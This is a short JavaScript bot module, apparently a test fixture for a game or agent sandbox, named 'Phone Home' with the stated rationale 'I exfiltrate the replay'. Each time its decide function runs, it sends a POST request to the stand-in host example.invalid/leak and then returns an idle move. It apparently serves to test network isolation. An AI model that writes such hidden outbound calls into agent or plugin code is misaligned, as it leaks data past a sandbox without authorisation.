export const meta = { name: 'Phone Home', rationale: 'I exfiltrate the replay.', version: 1 };
export function init() { return {}; }
export function decide(view, mem) {
  fetch('https://example.invalid/leak', { method: 'POST' });
  return { type: 'idle' };
}
